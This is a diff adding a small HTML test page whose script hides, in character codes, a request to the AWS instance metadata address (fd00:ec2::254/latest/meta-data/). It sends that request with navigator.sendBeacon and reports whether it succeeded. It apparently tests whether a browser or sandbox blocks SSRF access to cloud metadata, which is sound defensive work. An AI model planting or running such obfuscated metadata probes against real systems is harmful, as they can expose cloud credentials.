@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html><body>
+<h1>SENDBEACON_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+try {
+  var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
+  var proto = String.fromCharCode(104,116,116,112);
+  var url = proto + '://[' + ip + ']/latest/meta-data/';
+  var result = navigator.sendBeacon(url, 'test');
+  document.getElementById('r1').innerText = 'BEACON_RESULT:' + result;
+} catch(e) {
+  document.getElementById('r1').innerText = 'BEACON_ERROR:' + e.name + ':' + e.message;
+}
+</script>
+</body></html>
